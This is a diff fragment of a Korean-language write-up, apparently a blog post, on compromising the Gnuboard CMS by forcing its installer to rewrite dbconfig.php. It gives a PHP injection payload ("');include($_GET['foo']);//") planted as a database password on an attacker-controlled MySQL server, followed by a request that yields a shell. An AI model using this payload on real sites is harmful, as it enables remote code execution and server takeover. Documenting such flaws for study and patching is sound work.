@@ -79,7 +79,6 @@ fwrite($f, "define('G5_MYSQL_SET_MODE', {$mysql_set_mode});\n\n");
 fwrite($f, "define('G5_TABLE_PREFIX', '{$table_prefix}');\n\n");</code></pre>
 
 > "dbconfig.php" 파일이 삭제되면 그누보드에선 install이 되지 않았다고 판단하여 위와 같은 install_db.php를 이용하여 다시 dbconfig.php 파일을 write해줍니다.
-
 > 이 때 "mysql_connect" 함수에서 정상적인 connection을 위해 php코드를 본인의 로컬 mysql 서버에 " ');include($_GET['foo']);// "와 같은 DB or PASSWORD를 셋팅해주고 외부접속을 허용합니다.
 
 >이 후 index.php?foo=파일명&cmd=ls 를 하면 정상적으로 쉘을 획득할 수 있습니다.
